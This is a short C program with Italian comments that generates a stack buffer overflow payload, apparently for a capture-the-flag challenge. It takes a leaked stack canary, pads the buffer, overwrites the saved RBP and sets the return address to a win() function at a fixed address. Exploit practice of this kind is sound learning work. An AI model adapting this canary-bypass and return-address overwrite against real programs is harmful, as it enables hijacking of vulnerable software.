#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main() {

    char payload[64];
    unsigned long canary;  
    unsigned long win_addr = 0x401715;  // Indirizzo della funzione win()
    
    printf("Inserisci il valore del canary (esadecimale): ");
    scanf("%lx", &canary);  

    // Riempie il buffer fino al canary
    memset(payload, 'A', 40);

    // Inserisce il valore del canary
    memcpy(payload + 40, &canary, 8);

    // riempio RBP  
    memset(payload + 48, 'B', 8);

    // Indirizzo della funzione win()
    memcpy(payload + 56, &win_addr, 8);

    fwrite(payload, 1, sizeof(payload), stdout);
    return 0;
}
